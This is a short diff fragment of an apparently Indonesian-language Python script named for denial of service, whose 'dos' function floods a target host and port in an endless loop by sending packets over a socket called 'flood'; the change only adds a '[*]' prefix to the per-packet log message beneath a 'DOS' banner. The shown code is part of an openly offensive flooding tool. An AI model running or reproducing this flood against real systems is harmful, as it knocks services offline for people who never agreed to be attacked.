@@ -12,7 +12,7 @@ async def dos(HOST: str,PORT: int) -> None:
         while (True):
             flood.sendto(packet,dest)
             flood.sendto(proxy,dest)
-            print(f"packet dikirimkan ke {dest[0]}")
+            print(f"[*] packet dikirimkan ke {dest[0]}")
 
 if __name__ == "__main__":
     print(figlet_format("DOS",font="larry3d"))
